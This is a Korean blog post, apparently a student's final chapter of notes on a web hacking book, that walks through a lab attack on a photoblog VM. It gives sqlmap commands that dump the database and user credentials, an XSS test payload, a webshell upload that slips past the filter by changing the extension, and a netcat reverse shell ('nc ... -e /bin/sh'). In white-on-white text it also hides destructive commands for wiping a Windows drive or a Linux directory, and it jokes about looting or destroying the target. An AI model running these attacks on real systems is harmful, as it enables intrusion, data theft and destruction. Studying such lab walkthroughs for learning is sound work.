---
layout: post
category : Practice

---

--------------------------------------------------

<center style="color:red;">
!warning!<br>

본 게시글은 본인의 학습기록을 위해 작성된 알려진 학습 기법<br>

함부로 악의적으로 이용은 엄연히 불법 임으로<br>

절대 시도하지 말 것이며<br>

사고 발생 시 본인은 절대로 책임지지 않습니다!<br>
</center>
--------------------------------------------------


<font size="3em" color="#0091ff"><br>

예고대로 마지막은 큐라레:마법도서관<br>
<br>
하겠습니다.<br>
</font><br>


<div align="center" >
<img src="/Art of Web Hacking/Chapter18/Chapter18.png" width="400" height="300"> <br>
</div><br>

<center><font size="5em" color="#0091ff">최종 실습</font> </center>
<font size="4em" color="#0091ff">1. 정보 수집</font> 

<font size="3em" color="#0091ff">
<br>

<div align="center" >
<img src="/Art of Web Hacking/Chapter18/001.png" width="520" height="420"> <br>
</div>스샷. 1<br>

-파라미터 값이 달라지는 것을 발견

<br><br><br>
<font size="4em" color="#0091ff">2. SQL 인젝션 공격</font>


<div align="center" >
<img src="/Art of Web Hacking/Chapter18/002.png" width="520" height="320"> <br>
</div>스샷. 2<br>

-'을 입력했을 때 SQL 형식 관련 에러가 발생하는 것을 볼 수 있습니다.<br>

<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%">sqlmap&nbsp;<span style="color:#0086b3"></span><span style="color:#ff3399">-</span>u&nbsp;http:<span style="color:#0086b3"></span><span style="color:#ff3399">/</span><span style="color:#0086b3"></span><span style="color:#ff3399">/</span><span style="color:#308ce5">192.</span><span style="color:#308ce5">68.</span><span style="color:#308ce5">37.</span><span style="color:#308ce5">133</span><span style="color:#ff3399">/</span>cat.php?id<span style="color:#0086b3"></span><span style="color:#ff3399">=</span>1’</div></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div><br>

<div align="center" >
<img src="/Art of Web Hacking/Chapter18/003.png" width="520" height="320"> <br>
</div>스샷. 3<br>
- 위 명령어를 통해 sqlmap을 실행시켜 인젝션 공격이 가능한 부분을 탐색,<br>굵게 표시된 부분을 보니 id 파라미터가 들어가는 곳이 취약한가 봅니다 :)

<div align="center" >
<img src="/Art of Web Hacking/Chapter18/004.png" width="520" height="320"> <br>
</div>스샷. 4<br>

<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#0086b3"></span><span style="color:#ff3399">&lt;</span>script<span style="color:#0086b3"></span><span style="color:#ff3399">&gt;</span>alert(<span style="color:#993333">'XSS'</span>)<span style="color:#0086b3"></span><span style="color:#ff3399">&lt;</span><span style="color:#0086b3"></span><span style="color:#ff3399">/</span>script<span style="color:#0086b3"></span><span style="color:#ff3399">&gt;</span></div></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div><br>

-sql 인젝션 공격과 xss 공격이 가능한 것을 확인할 수 있습니다.<br>

<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%">sqlmap&nbsp;<span style="color:#0086b3"></span><span style="color:#ff3399">-</span>u&nbsp;http:<span style="color:#0086b3"></span><span style="color:#ff3399">/</span><span style="color:#0086b3"></span><span style="color:#ff3399">/</span><span style="color:#308ce5">192.</span><span style="color:#308ce5">168.</span><span style="color:#308ce5">56.</span><span style="color:#308ce5">106</span><span style="color:#ff3399">/</span>cat.php?id<span style="color:#0086b3"></span><span style="color:#ff3399">=</span><span style="color:#308ce5">1</span>&nbsp;<span style="color:#0086b3"></span><span style="color:#ff3399">-</span><span style="color:#0086b3"></span><span style="color:#ff3399">-</span>current<span style="color:#0086b3"></span><span style="color:#ff3399">-</span>db</div></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div><br>


<div align="center" >
<img src="/Art of Web Hacking/Chapter18/005.png" width="520" height="201"> <br>
</div>스샷. 5<br>
- 현재 DB의 이름을 알아내고,<br>

<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%">sqlmap&nbsp;<span style="color:#0086b3"></span><span style="color:#ff3399">-</span>u&nbsp;http:<span style="color:#0086b3"></span><span style="color:#ff3399">/</span><span style="color:#0086b3"></span><span style="color:#ff3399">/</span><span style="color:#308ce5">192.</span><span style="color:#308ce5">168.</span><span style="color:#308ce5">56.</span><span style="color:#308ce5">106</span><span style="color:#ff3399">/</span>cat.php?id<span style="color:#0086b3"></span><span style="color:#ff3399">=</span><span style="color:#308ce5">1</span>&nbsp;<span style="color:#0086b3"></span><span style="color:#ff3399">-</span>D&nbsp;photoblog&nbsp;<span style="color:#0086b3"></span><span style="color:#ff3399">-</span><span style="color:#0086b3"></span><span style="color:#ff3399">-</span>dump</div></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div><br>


<div align="center" >
<img src="/Art of Web Hacking/Chapter18/006.png" width="520" height="201"> <br>
</div><br>
<div align="center" >
<img src="/Art of Web Hacking/Chapter18/007.png" width="520" height="201"> <br>
</div>스샷. 6-7<br>
- DB 내용을 덤프 시키고, USER 테이블로부터 사용자 정보를 탈취했습니다.
<br><br><br><br>
<font size="4em" color="#0091ff">3. 파일 업로드 공격</font>

<br>
<div align="center" >
<img src="/Art of Web Hacking/Chapter18/008.png" width="520" height="201"> <br>
</div><br>

-위에서 탈취한 정보를 통해 로그인 합니다.




<div align="center" >
<img src="/Art of Web Hacking/Chapter18/009.png" width="520" height="201"> <br>
</div>스샷. 8-9<br>

<div align="center" >
<img src="/Art of Web Hacking/Chapter18/010.png" width="520" height="64"> <br>
</div>
<div align="center" >
<img src="/Art of Web Hacking/Chapter18/011.png" width="520" height="64"> <br>
</div><br>

-New picture에서 [ add ]를 통해 webshell.php를 업로드해봤으나 실패ōxō<br>
<span style="color: #FFFFFF">~~-New picture에서 [ add ]를 통해 webshell.php를 업로드해봤으나 실패ōxō~~</span>

<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%">mv&nbsp;webshell.php&nbsp;webshell.PHP</div></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div><br>

<div align="center" >
<img src="/Art of Web Hacking/Chapter18/012.png" width="520" height="64"> <br>
</div>
<div align="center" >
<img src="/Art of Web Hacking/Chapter18/013.png" width="520" height="154"> <br>
</div><br>

-웹쉘 확장자명을 바꿔서 업로드 성공

<div align="center" >
<img src="/Art of Web Hacking/Chapter18/014.png" width="520" height="83"> <br>
</div>
<div align="center" >
<img src="/Art of Web Hacking/Chapter18/015.png" width="520" height="135"> <br>
</div><br>
- 이렇게 해서 사실상 타깃 시스템에 접근 성공했습니다. 이젠
<div align="center" >
<img src="/Art of Web Hacking/Chapter18/016.png" width="520" height="175"> <br>
</div><br>
- 이런 식으로 타깃의 시스템을 가지고 놀거나

<div align="center" >
<img src="/Art of Web Hacking/Chapter18/017.png" width="520" height="305"> <br>
</div><br>
- 아니면 루트권한까지 접근해서 아예<br> 추가 정보들을 탈취하고
탈주<a alt="My tumblr" href="https://www.youtube.com/watch?v=v2RidwP_oKQ&t=126s" style="color: #FFFFFF">빤스런</a>하시던가<br>
  <br>

-파계승으로 빙의해서 타깃 시스템을 신나게 파괴하시면 됩니다 ㅋㅅㅋ;<br>
<span style="color: #FFFFFF">~~cmd /c rd /s /q c:\//윈도우~~</span>
<br>
<span style="color: #FFFFFF">~~or~~</span>
<br>
<span style="color: #FFFFFF">~~cd /home/user/test 후 rm -rf ./*//리눅스~~</span>
<br><br><br>


<font size="4em" color="#0091ff">4. 리버스 쉘 침투</font>
<br>
<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%">nc&nbsp;<span style="color:#0086b3"></span><span style="color:#ff3399">-</span>lvnp&nbsp;<span style="color:#308ce5">4000</span></div></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div><br>

-먼저 터미널 하나에 리스닝 포트 열어제껴둡니다.<br>

<div align="center" >
<img src="/Art of Web Hacking/Chapter18/018.png" width="520" height="78"> <br>
</div><br>

<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%">nc&nbsp;<span style="color:#308ce5">192.</span><span style="color:#308ce5">168.</span><span style="color:#308ce5">37.</span><span style="color:#308ce5">116</span>&nbsp;<span style="color:#308ce5">4000</span>&nbsp;<span style="color:#0086b3"></span><span style="color:#ff3399">-</span>e&nbsp;<span style="color:#0086b3"></span><span style="color:#ff3399">/</span>bin<span style="color:#0086b3"></span><span style="color:#ff3399">/</span>sh</div></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div>


<div align="center" >
<img src="/Art of Web Hacking/Chapter18/019.png" width="520" height="78"> <br>
</div><br>
<div align="center" >
<img src="/Art of Web Hacking/Chapter18/020.png" width="520" height="138"> <br>
</div><br>
- 이렇게 리버스 쉘 침투 가 성공했습니다. 위 스크린샷처럼 가지고 놀거나

<div align="center" >
<img src="/Art of Web Hacking/Chapter18/021.png" width="520" height="238"> <br>
</div><br>
- 루트 추가 권한 까지 접근해서 추가정보들을 탈취하고 탈주하시면 됩니다. :)<br>


<span style="color: #FFFFFF"></span>
<center>

=====================================<br>
<br>

﻿드리어 마지막 챕터까지 작성이 끝났습니다. (*´∀｀）<br>
<br>

휴… 아예 작성 못할줄 알았는데 하늘이 도왔군요<br>
<br>

이젠 원하지 않는 분야로 아르바이트를 하게 되어도<br>
<br>

두고두고 소정의 시간 마다 망각하지 않겠네요ε-(´・｀)<br>
<br>

이젠 이 기초단계의 책에서 하산하고 다음 Level<br>
<br>

로 가야겠습니다. (✿╹◡╹)<br>
<br>

해킹 분야같은 경우 이제 부터 시작이니까 말이지요<br>
<br>

또 시간이 나면 프로그래밍 언어랑 알고리즘<br>
<br>

공부 혹은 코딩테스트 준비하고<br>
<br>
(본인 같은경우 개발자 부터 시작해서)<br>
<br>
(보안분야로 넘어갈 계획입니다)<br>
<br>

그림이나 일러스트 그려야겠습니다 (*´∀｀）<br>
<br>

내일 시간 나면 편의점으로 처들어가서<br>
<br>

이 책을 하산한 기념으로<br>
<br>

축배거리 사들고 축배를 들어야겠군요 끌끌…<br>
<br>

아무튼 이 장문을 읽어 주신 분들께 다시한번 감사드리고<br>
<br>

좋은 하루 되시고,<br>
<br>

하시는 일 잘되시길 바람니다. (ㆁᴗㆁ✿)<br>
<br>

그리고 중국코로나 조심하시길…。<br>




<div align="center" >
<img src="/Art of Web Hacking/Chapter12/005.png" width="320" height="320"> <br>
</div>

</center>
